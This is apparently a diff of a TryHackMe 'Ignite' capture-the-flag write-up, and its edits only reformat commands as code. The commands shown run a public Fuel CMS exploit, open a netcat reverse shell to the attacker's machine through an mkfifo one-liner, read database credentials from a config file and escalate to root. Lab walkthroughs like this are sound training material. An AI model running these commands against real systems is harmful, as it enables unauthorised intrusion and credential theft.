@@ -37,22 +37,22 @@ Now we have two ways we can go, using the exploit we found or to try upload a re
 We're going to try the first way... Using the exploit we found! Why not?<br />
 First let's download the exploit onto our AttackBox - https://www.exploit-db.com/raw/50477<br />
 I downloaded it and named it exploit.py, let's run it and see if we can get a shell! This exploit requires no additional configuration.<br />
-python exploit.py<br />
+```python exploit.py```<br />
 It tells us we need to add the -u flag with the URL! Let's go.<br />
-python exploit.py -u http://10.10.105.97<br />
+```python exploit.py -u http://10.10.105.97```<br />
 If the exploit was succesful you will be asked to enter a command like I've done below<br />
 ![alt text](https://github.com/JcmniaCS/TryHackMe/blob/main/Ignite/screenshots/SCREENSHOT6.png?raw=true)<br />
 It looks like the exploit executes PHP system commands, let's get a reverse shell up for more functionality. To do this 
 we'll need to firstly open up a listener on our AttackBox, then we will send the PHP system command to spawn a reverse shell to that listener.<br />
 On our AttackBox:<br />
-nc -lvnp 8888<br />
+```nc -lvnp 8888```<br />
 <br />
 On our target with the PHP system commands:<br />
-rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.189.128 8888 >/tmp/f<br />
+```rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.189.128 8888 >/tmp/f```<br />
 ![alt text](https://github.com/JcmniaCS/TryHackMe/blob/main/Ignite/screenshots/SCREENSHOT7.png?raw=true)<br />
 Now we have our reverse shell opened! Let's have a look in /home<br />
-cd /home<br />
-ls<br />
+```cd /home```<br />
+```ls```<br />
 We see another folder www-data, after checking inside the folder we find a flag.txt, this must be our User flag!<br />
 ![alt text](https://github.com/JcmniaCS/TryHackMe/blob/main/Ignite/screenshots/SCREENSHOT8.png?raw=true)<br />
 After having a look around it looks like we'll need to escalate our privileges to get any further!<br />
@@ -60,29 +60,29 @@ After having a look around it looks like we'll need to escalate our privileges t
 ## Privilege Escalation
 
 Let's start looking for ways to escalate our privileges!
-uname -a 
+```uname -a ```
 ![alt text](https://github.com/JcmniaCS/TryHackMe/blob/main/Ignite/screenshots/SCREENSHOT9.png?raw=true)<br />
 4.15.0-45-generic is the version of our kernel, after looking there is an exploit but it requires us to have newuidmap which we do not have.<br />
 Let's continue looking...<br />
-sudo -l<br />
+```sudo -l```<br />
 ![alt text](https://github.com/JcmniaCS/TryHackMe/blob/main/Ignite/screenshots/SCREENSHOT10.png?raw=true)<br />
 No luck. I continued searching for a while then went back to see if I had missed something.<br />
 After going back to the website I noticed this:
 ![alt text](https://github.com/JcmniaCS/TryHackMe/blob/main/Ignite/screenshots/SCREENSHOT11.png?raw=true)<br />
 Let's have a look in the directory to see if there is any login information! Now we go back to our shell and use the following commands:<br />
-cd /var/www/html/fuel/application/config/<br />
-cat database.php<br />
+```cd /var/www/html/fuel/application/config/```<br />
+```cat database.php```<br />
 ![alt text](https://github.com/JcmniaCS/TryHackMe/blob/main/Ignite/screenshots/SCREENSHOT13.png?raw=true)<br />
 Bingo! We see a login for the user root! Let's try using this password on the target system. First we'll need to get a more stable shell...<br />
 We should of done this at the start, whoops! Let's use Python:<br />
-python -c 'import pty;pty.spawn("/bin/bash")'<br />
+```python -c 'import pty;pty.spawn("/bin/bash")'```<br />
 ![alt text](https://github.com/JcmniaCS/TryHackMe/blob/main/Ignite/screenshots/SCREENSHOT14.png?raw=true)<br />
 Now we have a more stable shell let's try logging into the account we got from the database.php<br />
-su root
+```su root```<br />
 ![alt text](https://github.com/JcmniaCS/TryHackMe/blob/main/Ignite/screenshots/SCREENSHOT15.png?raw=true)<br />
 After entering the password we're in! Let's find the final flag.<br />
-cd /root<br />
-cat root.txt<br />
+```cd /root```<br />
+```cat root.txt```<br />
 ![alt text](https://github.com/JcmniaCS/TryHackMe/blob/main/Ignite/screenshots/SCREENSHOT16.png?raw=true)<br />
 
 ## Questions & Answers
